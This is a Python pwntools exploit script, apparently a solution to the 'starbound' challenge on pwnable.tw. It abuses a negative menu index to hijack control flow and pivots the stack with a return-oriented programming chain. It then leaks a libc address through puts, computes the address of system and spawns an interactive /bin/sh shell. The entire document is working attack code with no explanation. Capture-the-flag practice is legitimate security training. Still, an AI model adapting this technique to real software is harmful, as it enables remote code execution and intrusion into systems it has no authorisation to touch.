from pwn import *
import time
r=0x08048922 #: ret
lr=0x08048c58 #: leave; ret
pr=0x080491bc #: pop ebp ; ret
ppr=0x080498a9 #: pop ebx ; pop edi ; ret
pppr=0x080494da #: pop ebx ; pop esi ; pop edi ; ret
ppppr=0x080491b9 #: pop ebx ; pop esi ; pop edi ; pop ebp ; ret
popa=0x804b36d #: popa ; ret
read_plt=0x8048a70
puts_plt=0x8048b90
open_got=0x8055014
base_stage=0x8058100

s=process("./starbound")
#s=remote("chall.pwnable.tw",10202)
s.recvuntil("> ")
s.send("6\n")
s.recvuntil("> ")
s.send("2\n")
s.recvuntil(": ")
s.send(p32(popa)+"\n")
s.recvuntil("> ")
s.send("1\n")
s.recvuntil("> ")
pause()
payload="-33"+"a"*9

#using leave to use fake ebp
payload+=p32(read_plt)+p32(pppr)+p32(0)+p32(base_stage)+p32(100)+p32(pr)+p32(base_stage)+p32(lr)
s.send(payload+"\n")
time.sleep(1)
#leak
payload2="AAAA"+p32(puts_plt)+p32(pr)+p32(open_got)+p32(read_plt)+p32(pppr)+p32(0)+p32(base_stage+0x100)+p32(100)+p32(pr)+p32(base_stage+0x100)+p32(lr)
s.send(payload2+"/bin/sh\x00"+"\n")
time.sleep(1)
bsd_signal_addr=u32(s.recv(1024)[24:28])
system=bsd_signal_addr-0x02be20+0x03ada0

print(hex(system))

payload3="AAAA"+p32(system)+"AAAA"+p32(base_stage+0x30)
s.send(payload3+"\n")

s.interactive()
s.close()
